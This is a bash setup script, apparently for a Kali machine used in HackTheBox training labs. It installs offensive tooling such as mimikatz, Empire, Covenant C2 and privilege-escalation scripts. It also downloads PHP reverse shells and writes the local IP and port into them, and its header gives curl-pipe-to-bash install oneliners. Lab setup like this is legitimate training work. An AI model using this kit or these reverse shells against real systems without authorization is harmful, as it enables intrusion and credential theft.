#!/usr/bin/env bash
## =======================================================================================
# File:     bootstrap-htb.sh
# Author:   Cashiuus
# Created:  08-Apr-2020     Revised: 18-Jun-2023
#
##-[ Info ]-------------------------------------------------------------------------------
# Purpose:  Run this script on new Kali images to automatically configure and
#           install packages needed for HackTheBox challenges.
#
#
# Oneliner: wget -qO bootstrap-htb.sh https://raw.githubusercontent.com/Cashiuus/penprep/master/system-setup/kali/bootstrap-htb.sh && bash bootstrap-htb.sh
#
# Shorter: curl -sSL https://raw.githubusercontent.com/Cashiuus/penprep/master/system-setup/kali/bootstrap-htb.sh | bash
#
#
# Credits:  + g0tmi1k for teaching me bash scripting through his kali OS scripts
#
##-[ Changelog ]-----------------------------------------------------------------------
#   2023-03-18: Ensuring the PEDA plugin is configured for gdb
#   2022-11-28: Added tools like witnessme, eviltree,
#   2022-05-18: Added xsshunter-client and ppmap (proto pollution scanner)
#   2022-04-28: Added win php shell, enhanced updater capability, now grabs IP to put into saved shells
#   2022-03-20: Re-organized transfer-stage so that pivoting, shells, & privesc tools are all in here (we transfer all of them)
#   2022-01-24: Minor bugfixes; Added firepwd go the git clone list
#   2020-12-27: Removed python 2 from setup completely, as python 3 is the default now
#   2021-03-29: Massive update on folder structure, installed tools, and Obsidian for notetaking
#   2021-03-30: Added installation of my dotfiles for bash, zsh, tmux, and aliases
#   2022-01-11: Added adfind.exe utility to toolkit
#
##-[ Copyright ]--------------------------------------------------------------------------
#   MIT License ~ http://opensource.org/licenses/MIT
## =======================================================================================
__version__="3.2.6"
__author__="Cashiuus"
## ==========[ TEXT COLORS ]============= ##
GREEN="\033[01;32m"     # Success
YELLOW="\033[01;33m"    # Warnings/Information
RED="\033[01;31m"       # Issues/Errors
BLUE="\033[01;34m"      # Heading
ORANGE="\033[38;5;208m" # Debugging
PURPLE="\033[01;35m"    # Other
GREY="\e[90m"           # Subdued Text
BOLD="\033[01;01m"      # Highlight
RESET="\033[00m"        # Normal
## =============[ CONSTANTS ]============= ##
START_TIME=$(date +%s)
STAGE=0                                                         # Current task number
TOTAL=$( grep '(${STAGE}/${TOTAL})' $0 | wc -l );(( TOTAL-- ))  # Total tasks number

## =======[ EDIT THESE SETTINGS ]======= ##
VPN_BASE_DIR="${HOME}/vpn"
HTB_BASE_DIR="${HOME}/htb"                      # Parent dir for all our HTB stuff
HTB_BOXES="${HTB_BASE_DIR}/boxes"               # Our challenge boxes artifacts as we go
HTB_TOOLKIT_DIR="${HOME}/git"                   # Toolkit dir for use permanently on this system
HTB_NOTES="${HOME}/notebooks"                   # Our notes repository
HTB_TRANSFERS="${HOME}/transfer-stage"          # Everything in one place for file transfers
HTB_PIVOTING="${HTB_TRANSFERS}/pivoting"        # Resources for pivoting/c2
HTB_PRIVESC="${HTB_TRANSFERS}/privesc"          # Privesc tools for both Linux and Windows
HTB_SHELLS="${HTB_TRANSFERS}/shells"            # Various shells we can use (or created along the way)
BURPSUITE_CONFIG_DIR="${HOME}/burpsuite"        # Burpsuite configs, libs, extensions, etc in one place
PORT='9000'                                     # Port you want inserted into saved reverse shells


# Uncomment These Variables instead if you prefer a "root" type of Kali environment
#HTB_TOOLKIT_DIR="/opt"


# Arrays listing all of the dirs we will create
CREATE_USER_DIRECTORIES=(burpsuite git go vpn)                      # Subdirs of $HOME/
CREATE_OPT_DIRECTORIES=()                                           # Subdirs of /opt/
CREATE_TOOLKIT_DIRS=(pivoting privesc shells transfers)
CREATE_HTB_DIRS=(boxes credentials wordlists)                       # Project-specific HTB subdirs
CREATE_HTB_BOX_SUBDIRS=(scans loot)                                 # Future use; subdirs for each box


## ========================================================================== ##
# ================================[  BEGIN  ]================================ #
function install_sudo() {
  [[ ${INSTALL_USER} ]] || INSTALL_USER=${USER}
  [[ "$DEBUG" = true ]] && echo -e "${ORANGE}[DEBUG] Running 'install_sudo' function${RESET}"
  echo -e "${GREEN}[*]${RESET} Now installing 'sudo' package via apt-get..."
  echo -e "\n${GREEN}[INPUT]${RESET} Enter root password below"
  su -c "apt-get -y install sudo" root
  [[ $? -eq 1 ]] && echo -e "${RED}[ERROR] Unable to install sudo via apt-get${RESET}" && exit 1

  echo -e "\n${GREEN}[INPUT]${RESET} Adding user ${BLUE}${INSTALL_USER}${RESET} to sudo group. Enter root password below"
  su -c "usermod -a -G sudo ${INSTALL_USER}" root
  [[ $? -eq 1 ]] && echo -e "${RED}[ERROR] Unable to add original user to sudoers${RESET}" && exit 1

  echo -e "\n\n${YELLOW}[WARN]${RESET} Rebooting system to take effect!"
  echo -e "${YELLOW}[INFO]${RESET} Restart this script after login!\n\n"
  sleep 5s
  su -c "init 6" root
  exit 0
}


# -- Script Arguments ----------------------------------------------------------
while [[ "${#}" -gt 0 && ."${1}" == .-* ]]; do
  opt="${1}";
  shift;
  case "$(echo ${opt} | tr '[:upper:]' '[:lower:]')" in
    -|-- ) break 2;;

    -update|--update )
      update=true;;

    -burp|--burp )
      burpPro=true;;

    *) echo -e "${RED}[ERROR]${RESET} Unknown argument passed: ${RED}${opt}${RESET}" 1>&2 \
      && exit 1;;
  esac
done


# -- Banner --------------------------------------------------------------------
function print_banner() {
  clear
  cat << "EOF"

               . - ' - .
          _ - '          ' - _
      ▓ |                      | ▓
      ▓ |  --- '               | ▓
      ▓ |  |                   | ▓
      ▓ |  |              .    | ▓
      ▓ |               .;;............ ..
      ▓ |  |          .::;;::::::::::::..
      ▓ |  |           ':;;:::::::::::: . .
      ▓ |  |             ':    | ▓
      ▓ |  |                   | ▓
      ▓ :   '                  : ▓
       ▓ \   '     TMC        / ▓
        ▓ \   '              / ▓
         ▓ \   '            / ▓
          ▓ `\            /` ▓
            ▓ `\        /` ▓
              ▓ `\    /` ▓
                 ▓ \/ ▓
                   ▀▀
EOF
  echo -e "\n\n${BLUE}. . . . ${RESET}${BOLD}HackTheBox Base Kali Bootstrapper  ${RESET}${BLUE}. . . .${RESET}"
  echo -e "\t\t${BLUE}v${RESET} ${__version__} ${BLUE}by${RESET} ${__author__}"
  echo -e "${BLUE}---------------------------------------------------${RESET}"
}
print_banner


function asksure() {
  ###
  # Usage:
  #   if asksure; then
  #        echo "Okay, performing rm -rf / then, master...."
  #   else
  #        echo "Awww, why not :("
  #   fi
  ###
  echo -e -n "\n\n${GREEN}[+]${RESET} ${1} (Y/N): "
  while read -r -n 1 -t 20 -s answer; do
    if [[ $answer = [YyNn] ]]; then
      [[ $answer = [Yy] ]] && retval=0
      [[ $answer = [Nn] ]] && retval=1
      break
    fi
  done
  echo
  return $retval
}

function check_root() {
  if [[ $EUID -ne 0 ]]; then
    # If not root, check if sudo package is installed
    if [[ $(which sudo) ]]; then
      # This accounts for both root and sudo. If normal user, it'll use sudo.
      # If you run script as root, $SUDO is blank and script will soldier on.
      export SUDO="sudo"
      echo -e "${YELLOW}[WARN] This script leverages sudo for installation. Enter your password when prompted!${RESET}"
      sleep 1
      # Test to ensure this user is able to use sudo
      sudo -l >/dev/null
      if [[ $? -eq 1 ]]; then
        # sudo pkg is installed but current user is not in sudoers group to use it
        echo -e "${RED}[ERROR]${RESET} You are not able to use sudo. Running install to fix."
        read -r -t 5
        install_sudo
      fi
    else
      echo -e "${YELLOW}[WARN]${RESET} The 'sudo' package is not installed."
      echo -e "${YELLOW}[+]${RESET} Press any key to install it (*You'll be prompted to enter sudo password). Otherwise, manually cancel script now..."
      read -r -t 5
      install_sudo
    fi
  fi
}
check_root


# --- Get Current IP to put into shell files ----
IP=$(hostname -I | awk '{print $2}')
if [[ -z $IP ]]; then
  # You aren't connected to VPN and it failed to grab a secondary IP, so fallback to first one?
  IP=$(hostname -I | awk '{print $1}')
fi



function install_or_update_git() {
  # Purpose: Attempt git clone to current directory, if fails, cd into it and do git pull
  #
  #   Usage:  install_or_update_git <dir_name> <github_url>
  #         $1 dir_name
  #         $2 github_url
  if [[ $# -lt 2 ]]; then
    echo -e "${RED}[ERR]${RESET} Not enough args to install or update the provided git repo"
    return 1
  fi
  # depth=1 makes it a shallow clone, which just means less history and is efficient for non-dev use of tools
  git clone --depth=1 "$2" "$1" 2>/dev/null
  if [[ $? -ne 0 ]]; then
    # git clone failed, so try to cd in and update it
    echo -e "${YELLOW}[WRN]${RESET} ${2} is already installed. Updating it instead..."
    cd "${1}"
    if [[ $? -eq 0 ]]; then
      git pull >/dev/null
      cd ..
      return 0
    fi
  else
    return 0
  fi
  return 1
}


# ===========================[ Begin Installs ]============================== #
# Fix display output for GUI programs (when connecting via SSH)
export DISPLAY=:0.0
export TERM=xterm-256color

# -- VM Tools First and Foremost ---------
# https://github.com/vmware/open-vm-tools
# VMware vm does not have this file, while AWS boxes do and will be "xen"
if [[ ! -f /sys/hypervisor/type ]] &&  [[ ! $(which vmware-toolbox-cmd) ]]; then
  echo -e "\n${YELLOW}[WARN] Now installing vm-tools. This will require a reboot. Re-run script after reboot...${RESET}"
  sleep 2
  $SUDO apt-get -y -qq install open-vm-tools-desktop fuse
  echo -e "${YELLOW}[WARN] Rebooting in 5 seconds, type CTRL+C to cancel..."
  sleep 5
  $SUDO reboot
fi

# ==========[ Updater ]=============
if [[ "$update" = true ]]; then
  # Only do update stuff
  echo ''
fi


function configure_terminal_settings() {
  # Increase Bash history settings
  file="${HOME}/.bashrc"
  sed -i 's/^HISTSIZE=.*/HISTSIZE=90000/' "${file}"
  sed -i 's/^HISTFILESIZE=.*/HISTFILESIZE=9999/' "${file}"

  if [[ ${GDMSESSION} == 'lightdm-xsession' ]]; then
    # Increasing terminal history scrolling limit
    file="${HOME}/.config/qterminal.org/qterminal.ini"
    [[ -s "${file}" ]] && sed -i 's/^HistoryLimitedTo=.*/HistoryLimitedTo=30000/' "${file}"
  fi
}
[[ "$update" != true ]] && configure_terminal_settings


# =============[ APT Packages ]============= #
function reset_apt_sources() {
  # Change the apt/sources.list repository listings to just a single entry:
  echo -e "\n${GREEN}[*] ${RESET}Resetting Aptitude sources.list to the 2 preferred kali entries"
  file=/etc/apt/sources.list
  [[ -e "${file}" ]] && $SUDO cp -n $file{,.bkup}
  if [[ $SUDO ]]; then
    echo "# kali-rolling" | $SUDO tee /etc/apt/sources.list
    echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" | $SUDO tee -a /etc/apt/sources.list
    echo "deb-src http://http.kali.org/kali kali-rolling main contrib non-free" | $SUDO tee -a /etc/apt/sources.list
  else
    echo "# kali-rolling" > /etc/apt/sources.list
    echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list
    echo "deb-src http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list
  fi
}
[[ "$update" != true ]] && reset_apt_sources


function update_os_apt() {
  echo -e "\n${GREEN}[*] ${RESET}Issuing apt-get update and dist-upgrade, please wait..."
  export DEBIAN_FRONTEND=noninteractive
  $SUDO apt-get -qq update
  $SUDO apt-get -y -q -o Dpkg::Options::="--force-confdef" \
    -o Dpkg::Options::="--force-confold" dist-upgrade
}
update_os_apt


function install_core_hacker_bundle() {
  echo -e "\n${GREEN}[*] ${BLUE}apt-get ::${RESET} Installing core utilities"
  $SUDO apt-get -y -qq --ignore-missing install bash-completion build-essential \
    curl dos2unix libreadline-dev gcc geany git gnumeric golang gzip jq \
    libssl-dev locate make net-tools openssl openvpn powershell pv tmux \
    wget unzip xclip

  $SUDO apt-get -y -qq --ignore-missing install geany htop strace sysv-rc-conf tree

  echo -e "\n${GREEN}[*] ${BLUE}apt-get ::${RESET} Installing common HTB tools"
  $SUDO apt-get -y -qq --ignore-missing install bloodhound brutespray crowbar \
  dirb dirbuster docx2txt exploitdb fcrackzip feroxbuster flameshot gdb \
  gobuster ipmitool libimage-exiftool-perl medusa neo4j nikto proxychains4 \
  rdesktop redsocks responder seclists shellter sqlmap sshuttle windows-binaries
}
# Ensure these are installed no matter what
install_core_hacker_bundle


function install_python3() {
  # Python 3
  $SUDO apt-get -y -qq install python3 python3-dev python3-pip python3-setuptools python3-venv || \
    echo -e "${YELLOW}[ERR] Errors occurred installing Python 3.x, you may have issues${RESET}" \
    && sleep 2
  $SUDO apt-get -y install python-is-python3

  # Pillow depends
  $SUDO apt-get -y -qq install libtiff5-dev libjpeg62-turbo-dev libfreetype6-dev \
      liblcms2-dev libwebp-dev libffi-dev zlib1g-dev
  # lxml depends
  $SUDO apt-get -y -qq install libxml2-dev libxslt1-dev zlib1g-dev
  # Postgresql and psycopg2 depends
  $SUDO apt-get -y -qq install libpq-dev

  # Install baseline set of system-wide pip packages
  # NOTE: argparse is a built-in, unless you are using Python < 2.7 or < 3.2
  file="/tmp/requirements.txt"
  cat <<EOF > "${file}"
argparse
beautifulsoup4
bloodhound
colorama
dnspython
donut-shellcode
future
htbclient
lxml
mechanize
netaddr
pefile
pep8
Pillow
pipx
psycopg2
pygeoip
python-Levenshtein
python-libnmap
rawsec-cli
requests
six
wheel
EOF
  python3 -m pip install -U pip
  python3 -m pip install -q -r -U "${file}" || \
    $SUDO python3 -m pip install -q -r -U "${file}"
}
[[ "$update" != true ]] && install_python3

# WitnessMe project, may be useful
python3 -m pip install -U pipx
pipx install witnessme


# -- Flameshot screenshotting, make it the default so global hotkeys work
function configure_keybindings_flameshot() {
  # Ensure that we make Flameshot the default app for global hotkeys "PrntScr" and "Ctrl+PrntScr"
  xfconf-query -n -c xfce4-keyboard-shortcuts -p '/commands/custom/Print' -t string -s "/usr/bin/flameshot gui"
  xfconf-query -n -c xfce4-keyboard-shortcuts -p '/commands/custom/<Primary>Print' -t string -s "/usr/bin/flameshot gui"
  xfconf-query -n -c xfce4-keyboard-shortcuts -p '/commands/custom/<Super>Print' -t string -s "/usr/bin/flameshot gui"
}
[[ "$update" != true ]] && configure_keybindings_flameshot


# -- Create Directory Structure -------------------------------------------------
if [[ "$update" != true ]]; then
  if asksure "Is this install for a pro/specific named lab?"; then
    echo -n -e "${GREEN}[+]${RESET} "
    read -r -e -t 20 -p "Enter simple one-word name for the lab: " HTB_LAB_NAME
  fi
  if [[ $HTB_LAB_NAME != "" ]]; then
    echo -e "${GREEN}[*]${RESET} Okay, your HackTheBox lab directory will be: ${ORANGE}${HTB_BASE_DIR}-${HTB_LAB_NAME}${RESET}"
    HTB_BASE_DIR="${HTB_BASE_DIR}-${HTB_LAB_NAME}"
    # Also need to re-declare these, bc they still have old name in their path
    HTB_BOXES="${HTB_BASE_DIR}/boxes"
    sleep 1s
  else
    HTB_BASE_DIR="${HTB_BASE_DIR}"
  fi

  # -- Dirs: $HOME core dirs -----------------------
  count=0
  while [ "x${CREATE_USER_DIRECTORIES[count]}" != "x" ]; do
      count=$(( $count + 1 ))
  done
  # Create folders in ~
  echo -e "${GREEN}[*]${RESET} Creating ${count} directories in current user's ${GREEN}HOME${RESET} directory path"
  for dir in ${CREATE_USER_DIRECTORIES[@]}; do
      mkdir -p "${HOME}/${dir}"
  done

  # -- Dirs: /opt core dirs -----------------------
  count=0
  while [ "x${CREATE_OPT_DIRECTORIES[count]}" != "x" ]; do
      count=$(( $count + 1 ))
  done
  # Create folders in /opt
  if [ $count -ge 1 ]; then
    echo -e "${GREEN}[*]${RESET} Creating ${count} directories in /opt/ path"
    for dir in ${CREATE_OPT_DIRECTORIES[@]}; do
        $SUDO mkdir -p "/opt/${dir}"
    done
  fi
fi

# -- Dirs: HTB Toolkit -----------------------
#if [[ "$update" != true ]]; then
  ##mkdir -p ~/htb/{boxes,credentials,shells,privesc,wordlists}
  ## Create core subdirs in our HTB_TOOLKIT_DIR
  #echo -e "${GREEN}[*]${RESET} Creating ${GREEN}HTB toolkit${RESET} core subdirectories"
  #for dir in ${CREATE_TOOLKIT_DIRS[@]}; do
      #mkdir -p "${HTB_TOOLKIT_DIR}/${dir}"
  #done
  #mkdir -p "${HTB_NOTES}/templates"
#fi

# -- Dirs: HTB Boxes -----------------------
if [[ "$update" != true ]]; then
  #mkdir -p ~/htb/{boxes,credentials,shells,privesc,wordlists}
  # Create core subdirs in our HTB BASE DIR
  echo -e "${GREEN}[*]${RESET} Creating ${GREEN}HTB project${RESET} core subdirectories"
  for dir in ${CREATE_HTB_DIRS[@]}; do
      mkdir -p "${HTB_BASE_DIR}/${dir}"
  done
fi

# -- Penprep repository -----------------------
if [[ ! -d "${HOME}/git/penprep" ]]; then
  cd "${HOME}/git" && git clone https://github.com/cashiuus/penprep
else
  cd "${HOME}/git/penprep" && git pull
fi

# -- Dotfiles -----------------------
if [[ "$update" != true ]]; then
  if [[ -d "${HOME}/git/penprep" ]]; then
    echo -e -n "\n${GREEN}[+]${RESET}"
    read -e -t 8 -i "Y" -p " Perform simple install of dotfiles? [Y,n]: " response
    echo -e

    case $response in
      [Yy]* ) DO_DOTFILES=true;;
    esac
  else
    echo -e "{GREEN}[*] ${BLUE}penprep${RESET} repo not found, skipping dotfiles install"
    sleep 2s
  fi

  [[ $DO_DOTFILES ]] && "${HOME}/git/penprep/dotfiles/install-simple.sh"
fi


# -- Various Extra Tools -------------------------------------------------------
function install_evilwinrm() {
  ### Evil-WinRM install
  echo -e "\n${GREEN}[*] ${RESET}Installing Evil-WinRM"
  $SUDO apt-get -y -qq install rubygems
  $SUDO gem install evil-winrm
}
[[ "$update" != true ]] && install_evilwinrm


# Get common shells to use
echo -e "\n${GREEN}[*] ${RESET}Grabbing useful ${BOLD}shells/backdoors${RESET}"
[[ ! -d "${HTB_SHELLS}" ]] && mkdir -p "${HTB_SHELLS}"
cd "${HTB_SHELLS}"
git clone https://github.com/borjmz/aspx-reverse-shell
git clone https://github.com/ivan-sincek/php-reverse-shell
git clone https://github.com/eb3095/php-shell
git clone https://github.com/infodox/python-pty-shells
git clone https://github.com/0dayCTF/reverse-shell-generator
git clone https://github.com/epinna/weevely3

# Ivan's version works on Windows targets, like a PHP webserver running on XAMPP
curl -SL 'https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php' -o 'ivan-reverse-shell.php' || echo -e "[ERROR] Failed to download Ivan's reverse-shell.php file"
file="${HTB_SHELLS}/ivan-reverse-shell.php"
# -- Build the code line and then 'sed' it into the file
#string="\$sh = new Shell("+"'"+"${IP}"+"'"+", $PORT);"
string="\$sh = new Shell("
string+="'"
string+="${IP}"
string+="'"
string+=", $PORT);"
#echo -e "[*] string: $string"
sed -i "s/^\$sh = new Shell.*/${string}/" "${file}"


[[ ! -d "${HTB_SHELLS}" ]] && mkdir -p "${HTB_SHELLS}"
cd "${HTB_SHELLS}"
curl -SL 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -o 'monkey-reverse-shell.php' || echo -e "[ERROR] Failed to download Pentest Monkey's php-reverse-shell.php file"
file="${HTB_SHELLS}/monkey-reverse-shell.php"
# Build strings and sed into the file
string="\$ip = "
string+="'"
string+="$IP"
string+="'"
string+=";"
sed -i "s/^\$ip =.*/${string}/" "${file}"
string="\$port = $PORT;"
sed -i "s/^\$port =.*/${string}/" "${file}"




echo -e "\n${GREEN}[*] ${RESET}Grabbing useful ${BOLD}Privilege Escalation${RESET} scanners"
[[ ! -d "${HTB_PRIVESC}" ]] && mkdir -p "${HTB_PRIVESC}"
cd "${HTB_PRIVESC}"
#git clone https://github.com/AlessandroZ/BeRoot
#git clone https://github.com/gentilkiwi/mimikatz
##git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite peass
#git clone https://github.com/enjoiz/Privesc Privesc-PS
#git clone https://github.com/n1nj4sec/pupy
#git clone https://github.com/skelsec/pypykatz
#git clone https://github.com/rasta-mouse/Sherlock
#git clone https://github.com/etc5had0w/suider
#git clone https://github.com/rasta-mouse/Watson
#git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
#git clone https://github.com/pentestmonkey/windows-privesc-check


declare -A gittools_privesc
gittools_privesc["BeRoot"]="https://github.com/AlessandroZ/BeRoot"
gittools_privesc["mimikatz"]="https://github.com/gentilkiwi/mimikatz"
gittools_privesc["peass-ng"]="https://github.com/carlospolop/PEASS-ng"
gittools_privesc["Privesc-PS"]="https://github.com/enjoiz/Privesc"
gittools_privesc["pupy"]="https://github.com/n1nj4sec/pupy"
gittools_privesc["pypykatz"]="https://github.com/skelsec/pypykatz"
gittools_privesc["Sherlock"]="https://github.com/rasta-mouse/Sherlock"
gittools_privesc["suider"]="https://github.com/etc5had0w/suider"
gittools_privesc["Watson"]="https://github.com/rasta-mouse/Watson"
gittools_privesc["Windows-Exploit-Suggester"]="https://github.com/AonCyberLabs/Windows-Exploit-Suggester"
gittools_privesc["windows-privesc-check"]="https://github.com/pentestmonkey/windows-privesc-check"


step=0
for t in "${!gittools_privesc[@]}"; do
  step=$((step + 1))
  cd "${HTB_PRIVESC}"
  install_or_update_git "$t" "${gittools_privesc[$t]}"
  if [[ $? -ne 0 ]]; then
    echo -e "${RED}[ERR]${RESET} (${step}/${#gittools_privesc[@]}) $t Failed to install/update, try it again later."
  else
    echo -e "${GREEN}[*]${RESET} (${step}/${#gittools_privesc[@]}) $t installed/updated successfully\n"
  fi
done



function install_covenant() {
  # -- Covenant C2 Framework (requires dotnet) -------
  echo -e "\n${GREEN}[*] ${RESET}Installing the Covenant C2 Framework for advanced labs"
  $SUDO apt-get -y install libc6 libgcc1 libgssapi-krb5-2
  $SUDO apt-get -y install libicu67 || $SUDO apt-get -y install libicu63
  $SUDO apt-get -y install libssl1.1 libstdc++6 zlib1g
  # Install .NET Guide: https://docs.microsoft.com/en-us/dotnet/core/install/linux-debian#debian-10-
  cd /tmp
  wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb \
    -O packages-microsoft-prod.deb
  $SUDO dpkg -i packages-microsoft-prod.deb
  $SUDO apt-get -qq update
  $SUDO apt-get -y install apt-transport-https
  $SUDO apt-get -qq update
  $SUDO apt-get install -y dotnet-sdk-5.0

  # Can disable auto collection of telemetry data to microsoft; put this in service file?
  export DOTNET_CLI_TELEMETRY_OPTOUT=1

  # Installing dev branch which is currently build on .NET SDK 5.0 (stable is on v3.1)
  cd /opt
  $SUDO git clone --recurse-submodules https://github.com/cobbr/Covenant -b dev
  if [[ $(which dotnet) ]]; then
    cd Covenant/Covenant
    $SUDO dotnet build
    $SUDO dotnet publish -c Release
    #$SUDO dotnet run
    # First-run you will need to go to https://localhost:7443/ and create new user

    # Setup a service for this: https://swimburger.net/blog/dotnet/how-to-run-a-dotnet-core-console-app-as-a-service-using-systemd-on-linux
    #file_original="/opt/Covenant/Covenant/covenant.service"
    file="/tmp/covenant.service"
    cat <<EOF > "${file}"
[Unit]
Description=Covenant Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/Covenant/Covenant
ExecStart=/usr/bin/dotnet /opt/Covenant/Covenant/bin/Release/net5.0/publish/Covenant.dll
Restart=on-failure

Environment=DOTNET_CLI_TELEMETRY_OPTOUT=1

[Install]
WantedBy=default.target
EOF
    # After copy, file should have permissions 0644 set automatically, but might want to verify
    $SUDO cp -u "${file}" /etc/systemd/system/covenant.service
    #$SUDO systemctl demon-reload
    #$SUDO systemctl start covenant
    #$SUDO systemctl enable covenant
  else
    echo -e "${RED}[ERROR] dotnet command not found, install must have failed.${RESET}"
    echo -e "${RED}\tGo here and fix:${RESET}  https://docs.microsoft.com/en-us/dotnet/core/install/linux-debian#debian-10-"
    echo -e "${RED}\t Once fixed, in /opt/Covenant/Covenant dir, run:${RESET} dotnet build && dotnet run"
  fi
}
[[ "$update" != true ]] && install_covenant



echo -e "\n${GREEN}[*] ${RESET}Loading a bunch of additional tools into ${HOME}/git/"

[[ ! -d "${HOME}/git" ]] && mkdir -p "${HOME}/git"
cd "${HOME}/git"
declare -A gittools
gittools["ADModule"]="https://github.com/samratashok/ADModule"
gittools["Bloodhound"]="https://github.com/BloodHoundAD/BloodHound"
gittools["brutespray"]="https://github.com/x90skysn3k/brutespray"
gittools["cupp"]="https://github.com/Mebus/cupp"                # Password list custom/gen toolkits
gittools["discover"]="https://github.com/leebaird/discover"
gittools["dnstwist"]="https://github.com/elceef/dnstwist"
gittools["donut"]="https://github.com/TheWover/donut"
gittools["dotdotpwn"]="https://github.com/wireghoul/dotdotpwn"
gittools["Empire"]="https://github.com/BC-SECURITY/Empire"
gittools["eviltree"]="https://github.com/t3l3machus/eviltree"     # Python-based tree with search cap.
gittools["firepwd"]="https://github.com/lclevy/firepwd"           # Firefox password extractor
gittools["Invoke-CradleCrafter"]="https://github.com/danielbohannon/Invoke-CradleCrafter"
gittools["Invoke-Obfuscation"]="https://github.com/danielbohannon/Invoke-Obfuscation"
gittools["mentalist"]="https://github.com/sc0tfree/mentalist"     # Password list custom/gen toolkit
gittools["nishang"]="https://github.com/samratashok/nishang"
gittools["nmapAutomator"]="https://github.com/21y4d/nmapAutomator"
gittools["pacu"]="https://github.com/RhinoSecurityLabs/pacu"      # AWS exploitation framework
#gittools["PowerSploit"]="https://github.com/PowerShellMafia/PowerSploit"
gittools["pass-station"]="https://github.com/noraj/pass-station"
gittools["peda"]="https://github.com/longld/peda"
gittools["PowerSploit_ZeroDayLab"]="https://github.com/ZeroDayLab/PowerSploit"   # This version has some PowerView additions
gittools["PowerUpSQL"]="https://github.com/NetSPI/PowerUpSQL"
gittools["ppmap"]="https://github.com/kleiton0x00/ppmap"
gittools["Seatbelt"]="https://github.com/GhostPack/Seatbelt"
gittools["SharpGen"]="https://github.com/cobbr/SharpGen"        # setup requires cmd: `dotnet build`
gittools["SprayingToolkit"]="https://github.com/byt3bl33d3r/SprayingToolkit"
gittools["tplmap"]="https://github.com/epinna/tplmap"           # Template scanner for SSTI vulns
gittools["WindowsExploits"]="https://github.com/abatchy17/WindowsExploits"
gittools["xsshunter-client"]="https://github.com/mandatoryprogrammer/xsshunter_client"
gittools["ysoserial"]="https://github.com/frohoff/ysoserial"
gittools["ysoserial.net"]="https://github.com/pwntester/ysoserial.net"


# New install method for all git tools using array
step=0
for t in "${!gittools[@]}"; do
  step=$((step + 1))
  cd "${HOME}/git"
  install_or_update_git "$t" "${gittools[$t]}"
  if [[ $? -ne 0 ]]; then
    echo -e "${RED}[ERR]${RESET} (${step}/${#gittools[@]}) $t Failed to install/update, try it again later."
  else
    echo -e "${GREEN}[*]${RESET} (${step}/${#gittools[@]}) $t installed/updated successfully\n"
  fi
done


# Configure PEDA plugin for use with GDB
grep -q "source ${HOME}/git/peda/peda.py" ~/.gdbinit 2>/dev/null \
  || echo "source ${HOME}/git/peda/peda.py" >> ~/.gdbinit


#[[ "$update" != true]] && cd SharpGen && dotnet build
cd "${HOME}/git"
cd SharpGen && dotnet build


[[ $(pip3 show autorecon 2>/dev/null) ]] || $SUDO python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
if [[ ! $(which autorecon) ]]; then
  cd "${HOME}/git"
  git clone https://github.com/Tib3rius/AutoRecon
  cd AutoRecon
  # TODO: Better to use a virtualenv, but only if it's easy for
  # users to auto-activate it anytime they want to use AutoRecon
  python3 -m pip install -r requirements.txt
  $SUDO ln -s "${HOME}/git/AutoRecon/src/autorecon/autorecon.py" local/bin/autorecon
  # TODO: which symlink option is better? If i put it local, do i still need sudo?
  #ln -s "${HOME}/git/AutoRecon/src/autorecon/autorecon.py" "${HOME}/.local/bin/autorecon"
fi

# Tools needed by AutoRecon
$SUDO apt-get -y install redis-tools wkhtmltopdf oscanner tnscmd10g


function install_default_creds_project() {
  # This tool leverages .csv file that remains online, so no reason
  # to clone the git permanently, we'll just grab it and install
  cd /tmp
  git clone https://github.com/ihebski/DefaultCreds-cheat-sheet
  cd DefaultCreds-cheat-sheet
  #python3 -m pip install -r requirements.txt
  # This prefix workaround is necessary to avoid perm issue bc it wants root/sudo
  python3 setup.py install --user --prefix=
  $SUDO updatedb
}
install_default_creds_project


function install_vulners() {
  # Custom nmap nse script to run CVE checks
  if [[ ! -f /usr/share/nmap/scripts/vulners.nse ]]; then
    cd /tmp
    # NOTE: This repo has another "http-vulners-regex.nse" you can read up on
    $SUDO git clone https://github.com/vulnersCom/nmap-vulners
    $SUDO cp /tmp/nmap-vulners/vulners.nse /usr/share/nmap/scripts/
    # Usage: nmap -sV --script vulners --script-args mincvss=7
    # Run this after we've imported all new nse scripts to load them
    $SUDO nmap --script-updatedb
  fi
}
# Disabling because I haven't found this useful and it's VERY noisy.
#install_vulners


### Python Impacket global install -- adds all scripts into PATH for use
if [[ ! -d /opt/impacket ]]; then
  echo -e "\n${GREEN}[*]${RESET} Installing Python Impacket collection"
  cd /opt
  $SUDO git clone https://github.com/SecureAuthCorp/impacket
  cd impacket
  $SUDO python3 setup.py install
else
  cd /opt/impacket && $SUDO git pull
  cd impacket
  # Still must run this installation so that the example scripts we use are copied with latest.
  # Meaning, files like /usr/local/bin/secretsdump.py are not symlinks, they need to be overwritten
  # with latest version, or we might get a python exception error about parsing the impacket version.
  $SUDO python3 setup.py install
fi


# -- Singular web directory for file transfers ----------------------------------
echo -e "\n${GREEN}[*]${RESET} Consolidating all our goodies in one place for ${BOLD}remote file transfers${RESET} (nc, mimi, scanners, etc)"
[[ ! -d "${HTB_TRANSFERS}" ]] && mkdir -p "${HTB_TRANSFERS}"

cd "${HTB_TRANSFERS}"
cp -n "/usr/share/windows-binaries/nc.exe" ./
cp -n "/usr/share/windows-binaries/wget.exe" ./
cp -n "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe" ./
cp -n "${HTB_PRIVESC}/Windows-Exploit-Suggester/windows-exploit-suggester.py" ./
cp -n "${HTB_PRIVESC}/Sherlock/Sherlock.ps1" ./
cp -n "${HOME}/git/PowerSploit/Privesc/PowerUp.ps1" ./
cp -n "${HOME}/git/PowerSploit/Privesc/Privesc.psd1" ./
cp -n "${HOME}/git/PowerSploit/Privesc/Privesc.psm1" ./
cp -n "${HOME}/git/PowerSploit/Recon/PowerView.ps1" ./
